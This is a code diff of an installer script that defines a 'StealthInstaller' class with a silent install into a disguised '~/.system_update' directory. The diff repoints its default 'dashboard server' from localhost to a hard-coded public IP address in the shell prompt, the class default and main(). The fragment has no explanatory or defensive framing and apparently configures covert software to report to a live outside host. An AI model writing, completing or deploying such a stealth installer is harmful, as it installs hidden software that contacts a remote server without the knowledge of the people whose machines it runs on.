@@ -36,11 +36,11 @@ print_error() {
 }
 
 # Get server URL from user
-echo -e "${YELLOW}Enter dashboard server URL (default: http://127.0.0.1:8000):${NC}"
+echo -e "${YELLOW}Enter dashboard server URL (default: http://103.129.149.67):${NC}"
 read -r SERVER_URL
 if [ -z "$SERVER_URL" ]
 then
-    SERVER_URL="http://127.0.0.1:8000"
+    SERVER_URL="http://103.129.149.67"
 fi
 
 print_status "Server URL: $SERVER_URL"
@@ -121,7 +121,7 @@ import json
 from pathlib import Path
 
 class StealthInstaller:
-    def __init__(self, server_url="http://127.0.0.1:8000"):
+    def __init__(self, server_url="http://103.129.149.67"):
         self.system = platform.system().lower()
         self.server_url = server_url
         self.install_dir = os.path.expanduser('~/.system_update')
@@ -139,7 +139,7 @@ class StealthInstaller:
             return False
 
 def main():
-    server_url = sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:8000"
+    server_url = sys.argv[1] if len(sys.argv) > 1 else "http://103.129.149.67"
     installer = StealthInstaller(server_url)
     success = installer.silent_install()
     sys.exit(0 if success else 1)
